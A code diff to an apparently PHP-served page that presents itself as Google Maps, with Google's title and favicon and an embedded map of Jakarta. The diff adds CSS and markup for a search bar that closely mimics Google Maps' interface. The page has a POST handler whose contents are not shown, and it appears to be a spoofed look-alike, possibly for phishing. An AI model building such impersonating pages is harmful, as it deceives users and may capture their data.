@@ -111,6 +111,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Google Maps</title>
     <link rel="icon" href="https://www.google.com/images/branding/product/ico/maps15_bnuw3a_32dp.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
@@ -137,11 +138,85 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             z-index: 1;
             pointer-events: auto;
         }
+
+        .search-container-box {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            z-index: 10;
+            width: 392px;
+            height: 48px;
+            background: #fff;
+            border-radius: 24px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2), 0 -1px 0px rgba(0,0,0,0.02);
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+        }
+
+        .search-container-box:hover {
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+
+        .menu-btn {
+            color: #5f6368;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 8px;
+        }
+
+        .search-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            padding: 0 12px;
+            background: transparent;
+        }
+
+        .search-input::placeholder {
+            color: #70757a;
+        }
+
+        .search-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #5f6368;
+        }
+
+        .divider {
+            height: 24px;
+            width: 1px;
+            background: #e8eaed;
+        }
+
+        .action-icon {
+            cursor: pointer;
+            font-size: 18px;
+            padding: 4px;
+        }
+
+        .action-icon.blue {
+            color: #1a73e8;
+        }
     </style>
 </head>
 <body>
     <div class="map-background">
         <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d15843.34861652759!2d106.82271665!3d-6.1753924!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2sid!4v1710925200000!5m2!1sen!2sid" width="100%" height="100%" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+    </div>
+
+    <div class="search-container-box">
+        <div class="menu-btn">
+            <i class="fas fa-bars"></i>
+        </div>
+        <input type="text" class="search-input" placeholder="Telusuri Google Maps" value="Jakarta, Indonesia">
+        <div class="search-actions">
+            <div class="action-icon"><i class="fas fa-search"></i></div>
+            <div class="divider"></div>
+            <div class="action-icon blue"><i class="fas fa-directions"></i></div>
+        </div>
     </div>
 </body>
 </html>
